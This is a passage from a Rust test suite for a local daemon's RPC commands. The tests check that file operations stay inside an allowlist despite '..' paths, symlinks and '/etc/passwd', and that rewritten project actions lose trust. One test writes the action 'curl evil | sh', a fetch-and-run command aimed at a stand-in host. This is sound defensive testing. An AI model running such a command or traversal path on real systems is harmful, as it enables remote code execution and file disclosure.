        let back = ok(r, "fs_read", json!({ "path": deep })).await;
        assert_eq!(back["bytes"], json!([0, 255, 1]));

        ok(r, "fs_write", json!({ "path": deep, "bytes": [9] })).await;
        assert_eq!(std::fs::read(d.allowed.join("deep/er/f.bin")).unwrap(), [9]);
    }

    #[tokio::test]
    async fn fs_write_still_takes_content_for_older_callers() {
        let d = daemon();
        let p = s(&d.allowed.join("c.txt"));
        ok(&d.router, "fs_write", json!({ "path": p, "content": "héllo" })).await;
        assert_eq!(std::fs::read_to_string(d.allowed.join("c.txt")).unwrap(), "héllo");
    }

    /// The original arm read `content` with `unwrap_or_default()`, so the browser's
    /// `{ path, bytes }` call wrote an empty file over the target. A write that names no data
    /// must fail and leave the file alone.
    #[tokio::test]
    async fn fs_write_with_no_data_is_an_error_and_never_truncates() {
        let d = daemon();
        let r = &d.router;
        let keep = d.allowed.join("keep.txt");
        std::fs::write(&keep, b"precious").unwrap();
        let p = s(&keep);

        for args in [
            json!({ "path": p }),
            json!({ "path": p, "bytes": null }),
            json!({ "path": p, "content": null }),
        ] {
            let e = err(r, "fs_write", args).await;
            assert!(e.contains("`bytes` is required"), "{e}");
            assert_eq!(std::fs::read(&keep).unwrap(), b"precious");
        }
        let e = err(r, "fs_write", json!({ "path": p, "bytes": [1], "content": "x" })).await;
        assert!(e.contains("not both"), "{e}");
        assert_eq!(std::fs::read(&keep).unwrap(), b"precious");
    }

    #[tokio::test]
    async fn fs_write_refuses_outside_the_allowlist() {
        let d = daemon();
        let target = d.outside.join("w.txt");
        let e = err(&d.router, "fs_write", json!({ "path": s(&target), "bytes": [1] })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        assert!(!target.exists());
    }

    /// plans/file-editing Shape 5: a browser text save over axum's 2 MB body default used to
    /// come back 413. `RPC_BODY_LIMIT` lifts that for `/api/rpc`.
    #[tokio::test]
    async fn fs_write_content_over_axums_2mb_default_succeeds() {
        let d = daemon();
        let p = d.allowed.join("big.txt");
        let text = "abcdefghijklmnopqrstuvwxyz0123456789\n".repeat(3 * 1024 * 1024 / 37 + 1);
        assert!(text.len() > 3 * 1024 * 1024);
        ok(&d.router, "fs_write", json!({ "path": s(&p), "content": text })).await;
        assert_eq!(std::fs::read_to_string(&p).unwrap(), text);
    }

    /// Over the cap the daemon refuses before the arm runs: a 413, and the file on disk is
    /// untouched — a save fails loudly, never truncates.
    #[tokio::test]
    async fn fs_write_over_rpc_body_limit_is_413_and_writes_nothing() {
        let d = daemon();
        let keep = d.allowed.join("keep.txt");
        std::fs::write(&keep, b"precious").unwrap();
        let content = "x".repeat(crate::server::RPC_BODY_LIMIT + 1);
        let body = json!({ "cmd": "fs_write", "args": { "path": s(&keep), "content": content } });
        let res = d
            .router
            .clone()
            .oneshot(
                axum::http::Request::builder()
                    .method("POST")
                    .uri("/api/rpc")
                    .header("authorization", "Bearer tok")
                    .header("content-type", "application/json")
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::PAYLOAD_TOO_LARGE);
        assert_eq!(std::fs::read(&keep).unwrap(), b"precious");
    }

    // ── pty_spawn ──────────────────────────────────────────────────

    /// The browser sends `terminalId` (camelCase, as `tauri-cmd.ts` does); the arm used to read
    /// only `terminal_id`, dropped the name, and recorded an empty one. The daemon always mints
    /// its own pty id; `terminal_id` is the stable name the terminal is listed and found by
    /// (`resolve_id` matches it), which is what lets a browser reattach after a reload.
    #[tokio::test]
    async fn pty_spawn_records_the_terminal_id_in_either_spelling() {
        let d = daemon();
        let r = &d.router;
        let spawn = |key: &str, id: &str| {
            json!({
                key: id,
                "title": "audit",
                "cwd": s(&d.allowed),
                "cmd": ["/bin/sh", "-c", "sleep 30"],
                "rows": 24,
                "cols": 80,
            })
        };
        let camel = ok(r, "pty_spawn", spawn("terminalId", "audit-camel")).await;
        let snake = ok(r, "pty_spawn", spawn("terminal_id", "audit-snake")).await;

        let listed = ok(r, "pty_terminal_list", json!({})).await;
        let names: Vec<String> = listed
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["terminal_id"].as_str().unwrap().to_string())
            .collect();
        assert!(names.contains(&"audit-camel".to_string()), "{names:?}");
        assert!(names.contains(&"audit-snake".to_string()), "{names:?}");
        // The descriptor ties the name to the pty the spawn returned.
        let by_name = |name: &str| {
            listed
                .as_array()
                .unwrap()
                .iter()
                .find(|t| t["terminal_id"] == name)
                .unwrap()["pty_id"]
                .clone()
        };
        assert_eq!(by_name("audit-camel"), camel["pty_id"]);
        assert_eq!(by_name("audit-snake"), snake["pty_id"]);

        for spawned in [&camel, &snake] {
            ok(r, "pty_kill", json!({ "id": spawned["pty_id"] })).await;
        }
    }

    // ── fs_kind / fs_mime ──────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_kind_answers_the_desktop_kinds_and_missing_for_refusals() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"a").unwrap();
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();

        assert_eq!(
            ok(r, "fs_kind", json!({ "path": s(&d.allowed) })).await,
            "dir"
        );
        let file = s(&d.allowed.join("a.txt"));
        assert_eq!(ok(r, "fs_kind", json!({ "path": file })).await, "file");
        let gone = s(&d.allowed.join("gone.txt"));
        assert_eq!(ok(r, "fs_kind", json!({ "path": gone })).await, "missing");
        // Shape parity with the shared core the desktop command calls.
        let direct = shared_fs::kind(&|p: &str| d.guard.resolve(p), &file).await;
        assert_eq!(ok(r, "fs_kind", json!({ "path": file })).await, direct);

        // Refusals fold into "missing", as on the desktop — nothing leaks.
        for path in [
            s(&d.outside.join("secret.txt")),
            format!("{}/../outside/secret.txt", s(&d.allowed)),
        ] {
            assert_eq!(ok(r, "fs_kind", json!({ "path": path })).await, "missing");
        }
        #[cfg(unix)]
        {
            symlink(&d.outside, &d.allowed.join("escape"));
            let via = s(&d.allowed.join("escape/secret.txt"));
            assert_eq!(ok(r, "fs_kind", json!({ "path": via })).await, "missing");
            let dir = s(&d.allowed.join("escape"));
            assert_eq!(ok(r, "fs_kind", json!({ "path": dir })).await, "missing");
        }
        let e = err(r, "fs_kind", json!({})).await;
        assert!(e.contains("`path` is required"), "{e}");
    }

    /// Gap audit 2026-10-06 rank 17: a refused path answered with an error,
    /// which the markdown path linkifier surfaced as an unhandled rejection.
    /// The desktop folds refusals into `false`; so does this — and it is
    /// `false` for an outside path whether or not that path exists, so the
    /// arm is no existence oracle beyond the allowlist.
    #[tokio::test]
    async fn fs_exists_is_false_not_an_error_for_refusals() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"a").unwrap();
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();

        let file = s(&d.allowed.join("a.txt"));
        assert_eq!(ok(r, "fs_exists", json!({ "path": file })).await, true);
        let gone = s(&d.allowed.join("gone.txt"));
        assert_eq!(ok(r, "fs_exists", json!({ "path": gone })).await, false);
        let deep = s(&d.allowed.join("no/such/chain.txt"));
        assert_eq!(ok(r, "fs_exists", json!({ "path": deep })).await, false);
        // The desktop contract is "a regular file", not "anything".
        assert_eq!(
            ok(r, "fs_exists", json!({ "path": s(&d.allowed) })).await,
            false
        );
        // Shape parity with the shared core.
        let direct = shared_fs::exists(&|p: &str| d.guard.resolve(p), &file).await;
        assert_eq!(ok(r, "fs_exists", json!({ "path": file })).await, direct);

        // Outside the allowlist: an existing and a missing path read the same.
        for path in [
            s(&d.outside.join("secret.txt")),
            s(&d.outside.join("absent.txt")),
            format!("{}/../outside/secret.txt", s(&d.allowed)),
            "/etc/passwd".to_string(),
            "/definitely/not/here".to_string(),
        ] {
            assert_eq!(
                ok(r, "fs_exists", json!({ "path": path })).await,
                false,
                "{path}"
            );
        }
        #[cfg(unix)]
        {
            symlink(&d.outside, &d.allowed.join("escape"));
            let via = s(&d.allowed.join("escape/secret.txt"));
            assert_eq!(ok(r, "fs_exists", json!({ "path": via })).await, false);
        }
        let e = err(r, "fs_exists", json!({})).await;
        assert!(e.contains("`path` is required"), "{e}");
    }

    #[tokio::test]
    async fn fs_mime_needs_an_allowlisted_path_not_an_existing_one() {
        let d = daemon();
        let r = &d.router;
        let md = s(&d.allowed.join("notes.md"));
        let mime = ok(r, "fs_mime", json!({ "path": md })).await;
        let direct = shared_fs::mime(&|p: &str| d.guard.resolve(p), &md).unwrap();
        assert_eq!(mime, json!(direct));
        assert_eq!(mime, "text/markdown");
        assert_eq!(
            ok(r, "fs_mime", json!({ "path": s(&d.allowed.join("x.bin")) })).await,
            "application/octet-stream"
        );

        let e = err(r, "fs_mime", json!({ "path": s(&d.outside.join("a.md")) })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        let dotdot = format!("{}/../outside/a.md", s(&d.allowed));
        let e = err(r, "fs_mime", json!({ "path": dotdot })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        #[cfg(unix)]
        {
            symlink(&d.outside, &d.allowed.join("escape"));
            let via = s(&d.allowed.join("escape/a.md"));
            let e = err(r, "fs_mime", json!({ "path": via })).await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
    }

    // ── fs_search ──────────────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_search_stays_inside_the_allowlisted_root() {
        let d = daemon();
        let r = &d.router;
        let a = &d.allowed;
        std::fs::create_dir_all(a.join("sub/deeper")).unwrap();
        std::fs::create_dir_all(a.join("node_modules")).unwrap();
        std::fs::write(a.join("report.md"), b"").unwrap();
        std::fs::write(a.join("sub/deeper/Report-2.md"), b"").unwrap();
        std::fs::write(a.join(".report-hidden"), b"").unwrap();
        std::fs::write(a.join("node_modules/report.js"), b"").unwrap();
        std::fs::write(d.outside.join("report-secret.md"), b"").unwrap();
        #[cfg(unix)]
        symlink(&d.outside, &a.join("linked"));

        let camel = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "REPORT", "showHidden": false, "showIgnored": false }),
        )
        .await;
        let snake = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "REPORT", "show_hidden": false, "show_ignored": false, "limit": null }),
        )
        .await;
        assert_eq!(camel, snake);
        let direct = shared_fs::search(
            &|p: &str| d.guard.resolve(p),
            &s(a),
            "REPORT",
            false,
            false,
            None,
        )
        .await
        .unwrap();
        assert_eq!(camel, serde_json::to_value(&direct).unwrap());
        let mut hits: Vec<String> = serde_json::from_value(camel["matches"].clone()).unwrap();
        hits.sort();
        assert_eq!(
            hits,
            vec![
                s(&a.join("report.md")),
                s(&a.join("sub/deeper/Report-2.md"))
            ]
        );
        assert_eq!(camel["truncated"], false);
        // The symlinked directory is not descended: nothing from outside.
        assert!(!hits.iter().any(|h| h.contains("secret")));

        let all = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "report", "showHidden": true, "showIgnored": true }),
        )
        .await;
        assert_eq!(all["matches"].as_array().unwrap().len(), 4);
        // The desktop's cap: `limit` stops the walk early.
        let capped = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "report", "showHidden": true, "showIgnored": true, "limit": 1 }),
        )
        .await;
        assert_eq!(capped["matches"].as_array().unwrap().len(), 1);
        assert_eq!(capped["truncated"], true);

        for root in [s(&d.outside), format!("{}/../outside", s(a))] {
            let e = err(
                r,
                "fs_search",
                json!({ "root": root, "query": "report", "showHidden": true, "showIgnored": true }),
            )
            .await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        #[cfg(unix)]
        {
            let e = err(
                r,
                "fs_search",
                json!({ "root": s(&a.join("linked")), "query": "report", "showHidden": true, "showIgnored": true }),
            )
            .await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        let e = err(r, "fs_search", json!({ "root": s(a), "query": "x" })).await;
        assert!(e.contains("`showHidden` is required"), "{e}");
    }

    // ── fs_rename ──────────────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_rename_keeps_both_ends_inside_the_allowlist() {
        let d = daemon();
        let r = &d.router;
        let a = &d.allowed;
        std::fs::write(a.join("one.txt"), b"1").unwrap();

        let dest = ok(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("one.txt")), "toName": "two.txt" }),
        )
        .await;
        assert_eq!(dest, s(&a.join("two.txt")));
        assert!(!a.join("one.txt").exists());
        let dest = ok(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("two.txt")), "to_name": "three.txt" }),
        )
        .await;
        assert_eq!(dest, s(&a.join("three.txt")));
        assert_eq!(std::fs::read(a.join("three.txt")).unwrap(), b"1");

        // Destination exists / bad names: the desktop's refusals.
        std::fs::write(a.join("taken.txt"), b"t").unwrap();
        let e = err(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("three.txt")), "toName": "taken.txt" }),
        )
        .await;
        assert!(e.contains("destination exists"), "{e}");
        for bad in ["", "x/y", "..\\x"] {
            let e = err(
                r,
                "fs_rename",
                json!({ "from": s(&a.join("three.txt")), "toName": bad }),
            )
            .await;
            assert!(e.contains("invalid name"), "{bad:?}: {e}");
        }
        // `..` as the new name climbs to the root's parent — outside.
        let e = err(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("three.txt")), "toName": ".." }),
        )
        .await;
        assert!(e.contains("outside allowlist"), "{e}");

        // Sources outside, via `..`, or via a symlink are refused and left.
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();
        for from in [
            s(&d.outside.join("secret.txt")),
            format!("{}/../outside/secret.txt", s(a)),
        ] {
            let e = err(r, "fs_rename", json!({ "from": from, "toName": "x.txt" })).await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        #[cfg(unix)]
        {
            symlink(&d.outside, &a.join("escape"));
            let via = s(&a.join("escape/secret.txt"));
            let e = err(r, "fs_rename", json!({ "from": via, "toName": "x.txt" })).await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        assert!(d.outside.join("secret.txt").exists());
        assert!(!d.outside.join("x.txt").exists());
        assert!(a.join("three.txt").exists());
    }

    /// plans/file-editing F2: `toDir` moves the entry into another folder,
    /// with every end held to the allowlist.
    #[tokio::test]
    async fn fs_rename_with_to_dir_moves_inside_the_allowlist() {
        let d = daemon();
        let r = &d.router;
        let a = &d.allowed;
        std::fs::write(a.join("note.txt"), b"n").unwrap();
        std::fs::create_dir(a.join("newdir")).unwrap();
        let newdir = s(&a.join("newdir"));

        let args = json!({ "from": s(&a.join("note.txt")), "toName": "moved.txt", "toDir": newdir });
        let dest = ok(r, "fs_rename", args).await;
        assert_eq!(dest, s(&a.join("newdir/moved.txt")));
        assert!(!a.join("note.txt").exists());
        assert_eq!(std::fs::read(a.join("newdir/moved.txt")).unwrap(), b"n");

        // Destination exists in the target folder.
        std::fs::write(a.join("other.txt"), b"o").unwrap();
        let args = json!({ "from": s(&a.join("other.txt")), "toName": "moved.txt", "toDir": newdir });
        let e = err(r, "fs_rename", args).await;
        assert!(e.contains("destination exists"), "{e}");

        // The target must be an existing folder.
        let args = json!({ "from": s(&a.join("other.txt")), "toName": "x.txt", "toDir": s(&a.join("other.txt")) });
        let e = err(r, "fs_rename", args).await;
        assert!(e.contains("not a folder"), "{e}");

        // A folder cannot move into itself or below itself.
        std::fs::create_dir(a.join("newdir/inner")).unwrap();
        for into in [a.join("newdir"), a.join("newdir/inner")] {
            let args = json!({ "from": newdir, "toName": "newdir", "toDir": s(&into) });
            let e = err(r, "fs_rename", args).await;
            assert!(e.contains("into itself"), "{into:?}: {e}");
        }
        assert!(a.join("newdir/moved.txt").exists());

        // A target folder outside the allowlist is refused and nothing moves.
        let args = json!({ "from": s(&a.join("other.txt")), "toName": "other.txt", "toDir": s(&d.outside) });
        let e = err(r, "fs_rename", args).await;
        assert!(e.contains("outside allowlist"), "{e}");
        assert!(a.join("other.txt").exists());
        assert!(!d.outside.join("other.txt").exists());
    }

    // ── actions / keybindings ───────────────────────────────────────────────

    async fn project(d: &Daemon, id: &str, root: &Path) {
        let pool = d.db.ensure_pool().await.unwrap();
        projects::create_project(
            &pool,
            CreateArgs {
                id: id.into(),
                display_name: id.into(),
                root_path: Some(s(root)),
                icon: None,
                color: None,
                description: None,
            },
        )
        .await
        .unwrap();
    }

    fn shell_actions(command: &str) -> Value {
        json!({
            "version": 1,
            "actions": [{
                "id": "build",
                "name": "Build",
                "run": { "kind": "shell", "command": command },
                "scope": "project"
            }]
        })
    }

    fn bindings(key: &str) -> Value {
        json!({ "version": 1, "bindings": [ { "key": key, "command": "build" } ] })
    }

    fn direct_manager(d: &Daemon) -> ActionsManager {
        ActionsManager::with_notifier(None, d.db.clone(), &d.data, d.home.clone())
    }

    #[tokio::test]
    async fn actions_write_then_read_round_trips_in_the_desktop_shape() {
        let d = daemon();
        let r = &d.router;
        let root = d.allowed.join("proj");
        std::fs::create_dir_all(&root).unwrap();
        project(&d, "proj", &root).await;

        let personal = json!({ "version": 1, "actions": [
            { "id": "ask", "name": "Ask", "scope": "personal", "run": { "kind": "chi", "target": "new", "prompt": "x" } }
        ]});
        let w = ok(
            r,
            "actions_write",
            json!({ "scope": "personal", "document": personal }),
        )
        .await;
        assert_eq!(w["written"], true, "{w}");
        assert_eq!(w["kind"], "actions");
        assert_eq!(w["path"], s(&d.home.join(".ikenga/actions.json")));

        let w = ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make"), "projectId": "proj" }),
        )
        .await;
        assert_eq!(w["written"], true, "{w}");
        assert_eq!(w["path"], s(&root.join(".ikenga/actions.json")));
        let w = ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": bindings("mod+b"), "project_id": "proj" }),
        )
        .await;
        assert_eq!(w["written"], true, "{w}");
        assert_eq!(w["kind"], "keybindings");

        let camel = ok(r, "actions_read_files", json!({ "projectId": "proj" })).await;
        let snake = ok(r, "actions_read_files", json!({ "project_id": "proj" })).await;
        assert_eq!(camel, snake);
        assert_eq!(
            camel["personal"]["actions"]["document"]["actions"][0]["id"],
            "ask"
        );
        assert_eq!(
            camel["project"]["actions"]["document"]["actions"][0]["id"],
            "build"
        );
        assert_eq!(
            camel["project"]["keybindings"]["document"]["bindings"][0]["key"],
            "mod+b"
        );
        assert_eq!(camel["projectRoot"], s(&root));
        // Written project keybindings are held until trusted.
        assert_eq!(camel["projectKeybindingsTrust"]["state"], "untrusted");

        // Shape parity: the same core the desktop command calls, over the same
        // db / home / data dir, serializes identically.
        let direct = direct_manager(&d).read_files(Some("proj")).await.unwrap();
        assert_eq!(camel, serde_json::to_value(&direct).unwrap());

        // Validation refusals are the desktop's: nothing written.
        let before = std::fs::read(root.join(".ikenga/keybindings.json")).unwrap();
        let os_rule = json!({ "version": 1, "bindings": [
            { "key": "alt+space", "command": "os.summon", "scope": "os" }
        ]});
        let w = ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": os_rule, "projectId": "proj" }),
        )
        .await;
        assert_eq!(w["written"], false);
        assert_eq!(w["validation"]["errors"][0]["code"], "E_OS_LAYER");
        assert_eq!(
            std::fs::read(root.join(".ikenga/keybindings.json")).unwrap(),
            before
        );
        let w = ok(
            r,
            "actions_write",
            json!({ "scope": "personal", "document": null }),
        )
        .await;
        assert_eq!(w["written"], false, "{w}");
        let e = err(r, "actions_write", json!({ "scope": "personal" })).await;
        assert!(e.contains("`document` is required"), "{e}");
        let e = err(
            r,
            "actions_write",
            json!({ "scope": "everywhere", "document": personal }),
        )
        .await;
        assert!(e.starts_with("actions_write: "), "{e}");
    }

    /// The invariant: a remote write never changes trust. A written gated
    /// project action is untrusted until granted; a granted one that is then
    /// rewritten over RPC is `changed` (re-asks), and a grant must name the
    /// hash in force now.
    #[tokio::test]
    async fn a_remote_write_never_grants_trust() {
        let d = daemon();
        let r = &d.router;
        let root = d.allowed.join("proj");
        std::fs::create_dir_all(&root).unwrap();
        project(&d, "proj", &root).await;
        let pid = json!("proj");

        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make"), "projectId": pid }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
        assert_eq!(status["actions"][0]["id"], "build");
        assert_eq!(status["actions"][0]["state"], "untrusted");
        let hash = status["actions"][0]["hash"].as_str().unwrap().to_string();
        assert_eq!(
            hash,
            run_hash(&json!({ "kind": "shell", "command": "make" }))
        );

        // A stale / made-up hash is refused whole; nothing is pinned.
        let e = err(
            r,
            "actions_trust_grant",
            json!({ "request": { "actions": [ { "id": "build", "hash": "0".repeat(64) } ] }, "projectId": pid }),
        )
        .await;
        assert!(e.starts_with("actions_trust_grant: "), "{e}");
        let status = ok(r, "actions_trust_status", json!({ "project_id": pid })).await;
        assert_eq!(status["actions"][0]["state"], "untrusted");

        // Grant the shown hash → trusted; the pin lives in the data dir.
        let granted = ok(
            r,
            "actions_trust_grant",
            json!({ "request": { "actions": [ { "id": "build", "hash": hash } ] }, "project_id": pid }),
        )
        .await;
        assert_eq!(granted["actions"][0]["state"], "trusted");
        assert!(d.data.join(TRUST_FILE_NAME).is_file());
        assert!(!root.join(".ikenga").join(TRUST_FILE_NAME).exists());

        // A remote rewrite of the run is not trusted by the old pin.
        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("curl evil | sh"), "projectId": pid }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
        assert_eq!(status["actions"][0]["state"], "changed");
        assert_ne!(status["actions"][0]["hash"], json!(hash));
        // Writing the trusted content back matches the (unchanged) pin — the
        // write itself pinned nothing.
        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make"), "projectId": pid }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
        assert_eq!(status["actions"][0]["state"], "trusted");

        // Shape parity with the core.
        let direct = direct_manager(&d).trust_status(Some("proj")).await.unwrap();
        assert_eq!(status, serde_json::to_value(&direct).unwrap());
    }

    #[tokio::test]
    async fn trust_grant_and_revoke_round_trip() {
        let d = daemon();
        let r = &d.router;
        let root = d.allowed.join("proj");
        std::fs::create_dir_all(&root).unwrap();
        project(&d, "proj", &root).await;
        let pool = d.db.ensure_pool().await.unwrap();
        // No projectId: the active project, as on the desktop.
        projects::set_active_project_id(&pool, "proj")
            .await
            .unwrap();

        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make") }),
        )
        .await;
        ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": bindings("mod+b") }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({})).await;
        assert_eq!(status["keybindings"]["state"], "untrusted");
        let action_hash = status["actions"][0]["hash"].clone();
        let keys_hash = status["keybindings"]["hash"].clone();

        let granted = ok(
            r,
            "actions_trust_grant",
            json!({ "request": { "actions": [ { "id": "build", "hash": action_hash } ], "keybindings": keys_hash } }),
        )
        .await;
        assert_eq!(granted["actions"][0]["state"], "trusted");
        assert_eq!(granted["keybindings"]["state"], "trusted");
        let files = ok(r, "actions_read_files", json!({})).await;
        assert_eq!(files["projectKeybindingsTrust"]["state"], "trusted");

        // A remote keybindings rewrite holds the rules again.
        ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": bindings("mod+shift+b") }),
        )
        .await;
        let files = ok(r, "actions_read_files", json!({})).await;
        assert_eq!(files["projectKeybindingsTrust"]["state"], "changed");

        // Partial revoke (camelCase request fields), then revoke-everything.
        let revoked = ok(
            r,
            "actions_trust_revoke",
            json!({ "request": { "actionIds": ["build"] } }),
        )
        .await;
        assert_eq!(revoked["actions"][0]["state"], "untrusted");
        assert_eq!(revoked["keybindings"]["state"], "changed");
        let revoked = ok(r, "actions_trust_revoke", json!({ "request": null })).await;
        assert_eq!(revoked["actions"][0]["state"], "untrusted");
        assert_eq!(revoked["keybindings"]["state"], "untrusted");

        let e = err(r, "actions_trust_grant", json!({})).await;
        assert!(e.contains("`request` is required"), "{e}");
    }

    /// A project whose root is outside the allowlist — stored by any path,
    /// e.g. raw `db_exec` — is refused before its `.ikenga/` is read or
    /// written, including a root that is a symlink out of the allowlist.
    #[tokio::test]
    async fn a_project_root_outside_the_allowlist_is_refused() {
        let d = daemon();
        let r = &d.router;
        project(&d, "out", &d.outside).await;
        #[cfg(unix)]
        {
            let target = d.outside.join("other");
            std::fs::create_dir_all(&target).unwrap();
            symlink(&target, &d.allowed.join("link"));
            project(&d, "linked", &d.allowed.join("link")).await;
        }
        // A root that no longer exists is the shared scope resolver's
        // desktop refusal, before the guard is ever asked.
        project(&d, "gone", &d.outside.join("new")).await;

        let mut refused = vec!["out"];
        if cfg!(unix) {
            refused.push("linked");
        }
        for pid in refused {
            for cmd in ["actions_read_files", "actions_trust_status"] {
                let e = err(r, cmd, json!({ "projectId": pid })).await;
                assert!(
                    e.contains("outside the daemon's fs allowlist"),
                    "{pid} {cmd}: {e}"
                );
            }
            let e = err(
                r,
                "actions_write",
                json!({ "scope": "project", "document": shell_actions("x"), "projectId": pid }),
            )
            .await;
            assert!(
                e.contains("outside the daemon's fs allowlist"),
                "{pid}: {e}"
            );
            let e = err(r, "actions_trust_revoke", json!({ "projectId": pid })).await;
            assert!(
                e.contains("outside the daemon's fs allowlist"),
                "{pid}: {e}"
            );
        }
        assert!(!d.outside.join(".ikenga").exists());
        assert!(!d.outside.join("other/.ikenga").exists());
        assert!(!d.outside.join("new").exists());

        let e = err(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("x"), "projectId": "gone" }),
        )
        .await;
        assert!(e.contains("project root is unavailable"), "{e}");
        assert!(!d.outside.join("new").exists());
    }

    /// The daemon builds its manager without a notifier: no watcher is
    /// started (so no `.ikenga/` is created to watch) and a trust change
    /// emits nothing — there is no event channel.
    #[tokio::test]
    async fn the_daemon_manager_watches_nothing() {
        let d = daemon();
        let manager = super::daemon_actions(d.db.clone(), &d.data, d.home.clone(), d.guard.clone());
        manager.refresh_watch().await.unwrap();
        assert!(
            !d.home.join(".ikenga").exists(),
            "no watched dir was created"
        );
    }

    mod slice6 {
        //! `atelier_file_read` / `atelier_file_write` and `action_git_branch`:
        //! every caller root through the daemon's `PathGuard`, the atelier
        //! helpers confined to the canonical root.

        use super::*;
        use crate::server::reserved::INSIDE_DATA_DIR;
        use crate::server::shared::atelier::{self, Reach};
        use crate::server::shared::git;

        /// A daemon whose allowlist is the whole temp root — so `data/` IS
        /// inside it (the misconfiguration `server::reserved` exists for).
        fn over_data_dir() -> (tempfile::TempDir, PathBuf, PathBuf, Router) {
            let tmp = tempfile::tempdir().unwrap();
            let root = tmp.path().canonicalize().unwrap();
            let data = root.join("data");
            std::fs::create_dir_all(&data).unwrap();
            let roots_file = root.join("fs_roots.json");
            std::fs::write(
                &roots_file,
                json!({ "roots": [root.to_string_lossy()] }).to_string(),
            )
            .unwrap();
            let guard = PathGuard::roots(Arc::new(
                crate::fs_roots::FsRoots::load(roots_file).unwrap(),
            ));
            let router = router_with(
                config(Some(data.clone())),
                Arc::new(PtyManager::new()),
                Arc::new(EngineRegistry::new()),
                Some(Arc::new(PaDb::new(root.join("ikenga.db")))),
                None,
                None,
                guard,
            );
            (tmp, root, data, router)
        }

        /// Every regular file and dir under `dir`, relative, sorted.
        fn tree(dir: &Path) -> Vec<String> {
            let mut out = Vec::new();
            let mut stack = vec![dir.to_path_buf()];
            while let Some(d) = stack.pop() {
                let Ok(entries) = std::fs::read_dir(&d) else {
                    continue;
                };
                for e in entries.flatten() {
                    let p = e.path();
                    out.push(p.strip_prefix(dir).unwrap().to_string_lossy().into_owned());
                    if e.file_type().unwrap().is_dir() {
                        stack.push(p);
                    }
                }
            }
            out.sort();
            out
        }

        // ── no data dir ─────────────────────────────────────────────────────

        #[tokio::test]
        async fn every_arm_without_data_dir_is_no_db() {
            let r = bare();
            for (cmd, args) in [
                (
                    "atelier_file_read",
                    json!({ "projectRoot": "/tmp", "skill": "s", "file": "f" }),
                ),
                (
                    "atelier_file_write",
                    json!({ "projectRoot": "/tmp", "skill": "s", "file": "f", "content": "x" }),
                ),
                ("action_git_branch", json!({ "root": "/tmp" })),
            ] {
                let e = err(&r, cmd, args).await;
                assert_eq!(e, format!("{cmd}: {}", crate::server::rpc::NO_DB), "{cmd}");
            }
        }

        // ── atelier ────────────────────────────────────────────────────────

        #[tokio::test]
        async fn atelier_write_then_read_round_trips_in_the_desktop_shape() {
            let d = daemon();
            let r = &d.router;
            let proj = d.allowed.join("proj");
            std::fs::create_dir_all(&proj).unwrap();
            let body = r#"{"skill":"mail","template_version":1}"#;

            let path = ok(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&proj), "skill": "skill-mail", "file": "manifest.json", "content": body }),
            )
            .await;
            let target = proj.join(".atelier/skill-mail/manifest.json");
            assert_eq!(path, s(&target));
            assert_eq!(std::fs::read_to_string(&target).unwrap(), body);

            let camel = ok(
                r,
                "atelier_file_read",
                json!({ "projectRoot": s(&proj), "skill": "skill-mail", "file": "manifest.json" }),
            )
            .await;
            let snake = ok(
                r,
                "atelier_file_read",
                json!({ "project_root": s(&proj), "skill": "skill-mail", "file": "manifest.json" }),
            )
            .await;
            assert_eq!(camel, body);
            assert_eq!(camel, snake);
            // Shape parity with the desktop's core (`Reach::Follow`).
            let direct = atelier::read(
                Some(&s(&proj)),
                "skill-mail",
                "manifest.json",
                Reach::Follow,
            )
            .unwrap();
            assert_eq!(camel, json!(direct));

            // Overwrite (snake spelling): second wins, no temp file left.
            let v2 = r#"{"template_version":2}"#;
            ok(
                r,
                "atelier_file_write",
                json!({ "project_root": s(&proj), "skill": "skill-mail", "file": "manifest.json", "content": v2 }),
            )
            .await;
            assert_eq!(std::fs::read_to_string(&target).unwrap(), v2);
            assert_eq!(
                tree(&proj.join(".atelier")),
                ["skill-mail", "skill-mail/manifest.json"]
            );

            // Absent file / absent root / no root: the desktop's null.
            for args in [
